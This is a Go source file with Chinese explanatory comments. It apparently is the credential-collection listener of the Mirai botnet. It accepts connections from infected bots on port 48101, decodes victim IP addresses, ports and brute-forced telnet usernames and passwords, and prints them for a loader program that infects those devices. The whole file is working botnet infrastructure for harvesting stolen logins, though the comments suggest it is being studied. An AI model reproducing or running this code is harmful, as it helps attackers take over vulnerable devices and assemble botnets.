package main

import (
    "fmt"
    "net"   //socket包
    "encoding/binary"  //大小端
    "errors"
    "time"
)

func main() {
    l, err := net.Listen("tcp", "0.0.0.0:48101")  //INADDR_ANY  通配地址
    if err != nil {
        fmt.Println(err)
        return
    }

    for {
        conn, err := l.Accept()//多线程服务器
        if err != nil {
            break
        }
        go handleConnection(conn)   //go  开启一个线程
    }
}

func handleConnection(conn net.Conn) {
    defer conn.Close()
    conn.SetDeadline(time.Now().Add(10 * time.Second))  //设置连接超时时间

    bufChk, err := readXBytes(conn, 1)    //读一个字节
    if err != nil {
        return
    }

    var ipInt uint32
    var portInt uint16

    if bufChk[0] == 0 {//读的第一个字节为0
        ipBuf, err := readXBytes(conn, 4)  //读4字节ip地址
        if err != nil {
            return
        }
        ipInt = binary.BigEndian.Uint32(ipBuf)  //大小端转换

        portBuf, err := readXBytes(conn, 2)  //2字节端口
        if err != nil {
            return;
        }

        portInt = binary.BigEndian.Uint16(portBuf)
    } else {
        ipBuf, err := readXBytes(conn, 3)
        if err != nil {
            return;
        }
        ipBuf = append(bufChk, ipBuf...)   //第一个字节和后面三个字节组成Ip

        ipInt = binary.BigEndian.Uint32(ipBuf)

        portInt = 23
    }

    uLenBuf, err := readXBytes(conn, 1)  //username长度
    if err != nil {
        return
    }
    usernameBuf, err := readXBytes(conn, int(byte(uLenBuf[0])))

    pLenBuf, err := readXBytes(conn, 1)  //password长度
    if err != nil {
        return
    }
    passwordBuf, err := readXBytes(conn, int(byte(pLenBuf[0])))
    if err != nil {
        return
    }

    //格式化输出　　ip:port user:pass

    //scanListen和loader跑在一个机器上，所以接收到bot上传的数据后，直接printf就可以了，loader的主线程一直在读取stdin
    fmt.Printf("%d.%d.%d.%d:%d %s:%s\n", (ipInt >> 24) & 0xff, (ipInt >> 16) & 0xff, (ipInt >> 8) & 0xff, ipInt & 0xff, portInt, string(usernameBuf), string(passwordBuf))
}

//从接收缓存中读取amount个字节的数据
func readXBytes(conn net.Conn, amount int) ([]byte, error) {
    buf := make([]byte, amount)
    tl := 0

    for tl < amount {
        rd, err := conn.Read(buf[tl:])
        if err != nil || rd <= 0 {
            return nil, errors.New("Failed to read")
        }
        tl += rd
    }

    return buf, nil
}
